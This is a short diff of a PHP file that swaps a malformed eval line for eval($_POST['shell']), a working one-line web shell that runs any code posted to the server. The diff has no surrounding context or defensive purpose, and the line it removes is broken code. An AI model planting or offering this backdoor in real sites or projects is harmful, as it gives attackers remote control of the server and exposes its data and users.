@@ -1,3 +1,3 @@
 <?php
-  eval(system$_GET['shell']);
+  eval($_POST['shell']);
 ?>
